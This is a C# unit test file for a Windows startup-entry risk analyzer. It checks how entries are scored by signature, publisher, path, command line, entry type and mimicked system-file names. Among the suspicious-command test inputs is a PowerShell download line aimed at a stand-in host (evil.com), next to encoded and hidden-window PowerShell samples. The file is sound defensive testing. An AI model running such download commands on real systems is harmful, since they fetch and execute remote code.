using FluentAssertions;
using Xunit;
using BootSentry.Core.Enums;
using BootSentry.Core.Models;
using BootSentry.Core.Services;

namespace BootSentry.Core.Tests.Services;

public class RiskAnalyzerTests
{
    private readonly RiskAnalyzer _analyzer = new();

    private static StartupEntry CreateEntry(
        SignatureStatus signatureStatus = SignatureStatus.Unknown,
        string? publisher = null,
        string? targetPath = null,
        string? commandLine = null,
        bool fileExists = true,
        EntryType entryType = EntryType.RegistryRun)
    {
        return new StartupEntry
        {
            Id = Guid.NewGuid().ToString(),
            DisplayName = "Test Entry",
            Type = entryType,
            Scope = EntryScope.User,
            SourcePath = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            SignatureStatus = signatureStatus,
            Publisher = publisher,
            TargetPath = targetPath,
            CommandLineRaw = commandLine,
            FileExists = fileExists
        };
    }

    // ============================================================
    // Signature Analysis Tests
    // ============================================================

    [Fact]
    public void Analyze_WithSignedTrusted_DecreasesRiskScore()
    {
        var entry = CreateEntry(signatureStatus: SignatureStatus.SignedTrusted);

        var result = _analyzer.Analyze(entry);

        result.TotalScore.Should().BeLessThan(0);
        result.Factors.Should().Contain(f => f.Name == "Signature" && f.Score < 0);
    }

    [Fact]
    public void Analyze_WithUnsigned_IncreasesRiskScore()
    {
        var entry = CreateEntry(signatureStatus: SignatureStatus.Unsigned);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Signature" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithSignedUntrusted_IncreasesRiskScore()
    {
        var entry = CreateEntry(signatureStatus: SignatureStatus.SignedUntrusted);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Signature" && f.Score > 0);
    }

    // ============================================================
    // Publisher Analysis Tests
    // ============================================================

    [Theory]
    [InlineData("Microsoft Corporation")]
    [InlineData("Google LLC")]
    [InlineData("Adobe Inc.")]
    [InlineData("NVIDIA Corporation")]
    public void Analyze_WithTrustedPublisher_DecreasesRiskScore(string publisher)
    {
        var entry = CreateEntry(publisher: publisher);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Publisher" && f.Score < 0);
    }

    [Fact]
    public void Analyze_WithUnknownPublisher_IncreasesRiskScore()
    {
        var entry = CreateEntry(publisher: null);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Publisher" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithNonTrustedPublisher_NoPublisherFactor()
    {
        var entry = CreateEntry(publisher: "Some Random Publisher Inc.");

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().NotContain(f => f.Name == "Publisher");
    }

    // ============================================================
    // Location Analysis Tests
    // ============================================================

    [Theory]
    [InlineData(@"C:\Temp\malware.exe")]
    [InlineData(@"C:\Users\user\Downloads\suspicious.exe")]
    [InlineData(@"C:\Users\Public\app.exe")]
    [InlineData(@"C:\Users\user\Desktop\program.exe")]
    public void Analyze_WithSuspiciousLocation_IncreasesRiskScore(string path)
    {
        var entry = CreateEntry(targetPath: path);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Location" && f.Score > 0);
    }

    [Theory]
    [InlineData(@"C:\Program Files\App\app.exe")]
    [InlineData(@"C:\Program Files (x86)\App\app.exe")]
    [InlineData(@"C:\Windows\System32\notepad.exe")]
    public void Analyze_WithStandardLocation_DecreasesRiskScore(string path)
    {
        var entry = CreateEntry(targetPath: path);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Location" && f.Score < 0);
    }

    // ============================================================
    // Command Line Analysis Tests
    // ============================================================

    [Theory]
    [InlineData("powershell.exe -enc SGVsbG8=")]
    [InlineData("powershell.exe -WindowStyle Hidden script.ps1")]
    [InlineData("cmd.exe /c \"(New-Object Net.WebClient).DownloadString('http://evil.com')\"")]
    public void Analyze_WithSuspiciousCommandLine_IncreasesRiskScore(string commandLine)
    {
        var entry = CreateEntry(commandLine: commandLine);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Command Line" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithNormalCommandLine_NoCommandLineFactor()
    {
        var entry = CreateEntry(commandLine: @"C:\Program Files\App\app.exe --startup");

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().NotContain(f => f.Name == "Command Line");
    }

    // ============================================================
    // File Existence Tests
    // ============================================================

    [Fact]
    public void Analyze_WithMissingFile_IncreasesRiskScore()
    {
        var entry = CreateEntry(targetPath: @"C:\nonexistent\app.exe", fileExists: false);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "File" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithExistingFile_NoFileFactor()
    {
        var entry = CreateEntry(targetPath: @"C:\existing\app.exe", fileExists: true);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().NotContain(f => f.Name == "File");
    }

    // ============================================================
    // Entry Type Tests
    // ============================================================

    [Fact]
    public void Analyze_WithIFEOType_IncreasesRiskScore()
    {
        var entry = CreateEntry(entryType: EntryType.IFEO);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Type" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithWinlogonType_IncreasesRiskScore()
    {
        var entry = CreateEntry(entryType: EntryType.Winlogon);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Type" && f.Score > 0);
    }

    [Fact]
    public void Analyze_WithRegistryRunType_NoTypeFactor()
    {
        var entry = CreateEntry(entryType: EntryType.RegistryRun);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().NotContain(f => f.Name == "Type");
    }

    // ============================================================
    // Name Mimicking Tests
    // ============================================================

    [Theory]
    [InlineData(@"C:\Temp\svchost.exe")]
    [InlineData(@"C:\Users\user\csrss.exe")]
    [InlineData(@"C:\Downloads\explorer.exe")]
    public void Analyze_WithMimickedSystemFileOutsideSystemDir_IncreasesRiskScore(string fullPath)
    {
        var entry = CreateEntry(targetPath: fullPath);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().Contain(f => f.Name == "Mimicry" && f.Score > 0);
    }

    [Theory]
    [InlineData(@"C:\Windows\System32\svchost.exe")]
    [InlineData(@"C:\Windows\SysWOW64\explorer.exe")]
    public void Analyze_WithSystemFileInSystemDir_NoMimicryFactor(string fullPath)
    {
        var entry = CreateEntry(targetPath: fullPath);

        var result = _analyzer.Analyze(entry);

        result.Factors.Should().NotContain(f => f.Name == "Mimicry");
    }

    // ============================================================
    // Risk Level Calculation Tests
    // ============================================================

    [Fact]
    public void Analyze_WithTrustedEntry_ReturnsLowRiskLevel()
    {
        var entry = CreateEntry(
            signatureStatus: SignatureStatus.SignedTrusted,
            publisher: "Microsoft Corporation",
            targetPath: @"C:\Program Files\App\app.exe",
            fileExists: true);

        var result = _analyzer.Analyze(entry);

        result.RecommendedRiskLevel.Should().Be(RiskLevel.Safe);
    }

    [Fact]
    public void Analyze_WithHighlyRiskyEntry_ReturnsCriticalRiskLevel()
    {
        var entry = CreateEntry(
            signatureStatus: SignatureStatus.Unsigned,
            publisher: null,
            targetPath: @"C:\Temp\svchost.exe",
            commandLine: "powershell.exe -enc SGVsbG8=",
            fileExists: false,
            entryType: EntryType.IFEO);

        var result = _analyzer.Analyze(entry);

        result.RecommendedRiskLevel.Should().Be(RiskLevel.Critical);
    }

    // ============================================================
    // UpdateRiskLevel Tests
    // ============================================================

    [Fact]
    public void UpdateRiskLevel_UpdatesEntryRiskLevel()
    {
        var entry = CreateEntry(
            signatureStatus: SignatureStatus.SignedTrusted,
            publisher: "Microsoft Corporation",
            targetPath: @"C:\Program Files\App\app.exe");

        _analyzer.UpdateRiskLevel(entry);

        entry.RiskLevel.Should().Be(RiskLevel.Safe);
    }

    [Fact]
    public void UpdateRiskLevel_WithSuspiciousEntry_SetsSuspiciousLevel()
    {
        var entry = CreateEntry(
            signatureStatus: SignatureStatus.Unsigned,
            publisher: null,
            targetPath: @"C:\Temp\app.exe");

        _analyzer.UpdateRiskLevel(entry);

        entry.RiskLevel.Should().BeOneOf(RiskLevel.Suspicious, RiskLevel.Critical);
    }
}
